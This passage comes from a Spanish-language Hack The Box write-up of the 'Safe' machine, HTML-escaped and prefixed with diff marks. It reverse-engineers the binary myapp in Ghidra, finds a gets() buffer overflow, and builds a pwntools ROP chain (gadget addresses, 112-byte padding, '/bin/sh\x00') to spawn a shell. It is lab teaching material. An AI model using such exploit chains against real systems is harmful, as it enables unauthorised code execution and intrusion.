-&lt;p&gt;Podemos observar que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DEP&lt;/code&gt; (&lt;em&gt;Data Execution Prevention&lt;/em&gt;), o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; (&lt;em&gt;No-Execute&lt;/em&gt;), está activado; esta protección nos impedirá ejecutar código a través del &lt;em&gt;stack&lt;/em&gt;, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, podemos explotarlo, a este concepto se lo conoce como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt; (&lt;em&gt;Return Oriented Programming&lt;/em&gt;).&lt;/p&gt;
-
-&lt;p&gt;Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar &lt;em&gt;ingeniería inversa&lt;/em&gt; sobre el binario, para hacerlo, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, una suite de herramientas dedicada a la &lt;em&gt;ingeniería inversa&lt;/em&gt;, desarrollada por la &lt;em&gt;NSA&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para descargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, ingresaremos &lt;a href=&quot;https://github.com/NationalSecurityAgency/ghidra/releases&quot;&gt;aquí&lt;/a&gt;, y descargaremos la versión más reciente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unzip &amp;lt;archivoQueHayamosDescargado&amp;gt;
-cd &amp;lt;carpetaQueSeHayaCreado&amp;gt;
-./ghidraRun
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Presionaremos &lt;em&gt;File&lt;/em&gt;, &lt;em&gt;New Project&lt;/em&gt;, &lt;em&gt;Non-Shared Project&lt;/em&gt;, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos &lt;em&gt;File&lt;/em&gt;, &lt;em&gt;Import File&lt;/em&gt;, seleccionamos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya en este punto podemos empezar a analizar que hay dentro del binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú &lt;em&gt;Functions&lt;/em&gt;, que se encuentra al lado izquierdo, podemos empezar por analizar la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;.
-&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, esto es lo que encontramos cuando ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;; nos damos cuenta de que se está definiendo una variable de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_78&lt;/code&gt; que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt;, una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, podríamos conseguir una consola dentro de la máquina víctima.&lt;/p&gt;
-
-&lt;p&gt;Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, y el concepto de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;No obstante, vamos a analizar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, para lo cual empezaremos por colocar la cabecera de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python 3&lt;/code&gt;, importar la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;, y definir tanto la &lt;em&gt;arquitectura&lt;/em&gt; como el &lt;em&gt;sistema operativo&lt;/em&gt; de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En caso de no contar con la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;, podemos hacer lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
-python3 -m pip install --upgrade pip
-python3 -m pip install --upgrade pwntools
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un &lt;em&gt;breakpoint&lt;/em&gt; en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de &lt;em&gt;What do you want me to echo back?&lt;/em&gt;, caso contrario, el script se cerrará.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/ubicación/del/binario/myapp&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b *0x40116e&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;What do you want me to echo back?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;La dirección de la llamada al sistema, la podemos sacar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 744 &amp;lt;nuestroScript.py&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En este punto podemos presionar la tecla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;, para continuar, y nos daremos cuenta que el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, está siendo almacenado en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En este punto, tenemos que buscar una forma de sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;, y la clave está en la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, en la dirección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401156&lt;/code&gt;, el contenido que se encuentra en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, está siendo almacenado en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;; ¿cuándo almacenábamos las &lt;em&gt;8 letras B&lt;/em&gt;, en qué registro las estábamos almacenando? Exacto, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, para que cuando esta termine, podamos ejecutar el comando que deseemos.&lt;/p&gt;
-
-&lt;p&gt;Sin embargo, hay un pequeño problema, en la siguiente instrucción, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401159&lt;/code&gt;, se está efectuando un &lt;em&gt;jump&lt;/em&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;? Esto lo haremos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt;, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa.&lt;/p&gt;
-
-&lt;p&gt;Haciendo uso de nuestro script, escribiremos ahora &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ropper&lt;/code&gt;, lo cual nos permitirá listar todos los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt; dentro del binario.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que se nos lista un total de &lt;em&gt;99 gadgets&lt;/em&gt;, de los cuales nos interesa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt;, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget pop&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper --search &quot;pop&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos, que tenemos una opción que nos permite hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, aunque esta va seguida de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pops&lt;/code&gt; a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan.&lt;/p&gt;
-
-&lt;p&gt;Ya con toda esta información, es posible finalmente, explotar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Return Oriented Programming&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt;, por lo que regresaremos a nuestro script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un &lt;em&gt;breakpoint&lt;/em&gt; a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;popR13&lt;/code&gt;, la cual va a valer la dirección en la que se aplica este &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget&lt;/code&gt;; la segunda será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, la cual va a valer la dirección de la llamada al sistema; la tercera será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, la cual va a valer la dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, la podemos sacar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401206&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40116e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Es importante tener en cuenta que, en todo momento, estamos trabajando en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Por otra parte, vamos a empezar por definir el número de &lt;em&gt;letras A&lt;/em&gt; que queremos introducir, previo a desbordar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, esto lo vamos a almacenar en una variable de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;junk&lt;/code&gt;, eso si, deberemos de codificar la variable en formato bytes.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si nos percatamos, estamos introduciendo &lt;em&gt;112 letras A&lt;/em&gt;, y no &lt;em&gt;120&lt;/em&gt;, porque ciertamente el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt; se desborda con &lt;em&gt;112 bytes&lt;/em&gt;, como pudimos ver con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, no obstante, para poder empezar a sobrescribir registros tenemos que introducir &lt;em&gt;120 bytes&lt;/em&gt; como vimos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, pues estamos frente a un &lt;em&gt;sistema operativo&lt;/em&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, por lo que necesitamos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8 bytes&lt;/code&gt; para insertar un valor en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stack&lt;/code&gt;, en caso de estar en un sistema operativo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32 bits&lt;/code&gt;, necesitaríamos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4 bytes&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Entonces, la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_78&lt;/code&gt; ciertamente tiene una longitud máxima de &lt;em&gt;112 bytes&lt;/em&gt;, sin embargo, necesitamos de &lt;em&gt;8 bytes&lt;/em&gt; más, para desbordar satisfactoriamente el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, pero hasta que no introduzcamos como mínimo &lt;em&gt;120 bytes&lt;/em&gt;, no vamos a conseguir un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt;, razón por la cual, si al binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa.&lt;/p&gt;
-
-&lt;p&gt;Lo que nos interesa ahora, es sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt; con nuestro código malicioso, de modo que este pase al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSI&lt;/code&gt;, de modo que cuando se ejecute la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; hacia la dirección de la llamada al sistema, nos ejecute nuestro código.&lt;/p&gt;
-
-&lt;p&gt;Concretamente vamos a ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; en adición de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt; por si nos da problemas, la longitud total de esta cadena es de &lt;em&gt;8 bytes&lt;/em&gt;, (7 en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, más el del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt;) por lo que estaríamos desbordando el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, e ingresando esta cadena en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La siguiente variable por definir será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binSh&lt;/code&gt;, la cual, como mencionamos, valdrá el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; en adición de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null byte&lt;/code&gt;, y al igual que la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;junk&lt;/code&gt;, deberemos codificarla; la última variable que definiremos será, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nullByte&lt;/code&gt;, la cual usaremos para asignar valores nulos a las direcciones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R14&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R15&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;binSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte &lt;em&gt;What do you want me to echo back?&lt;/em&gt;, para hacer esto tendremos que hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p.sendline()&lt;/code&gt;, dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden.&lt;/p&gt;
-
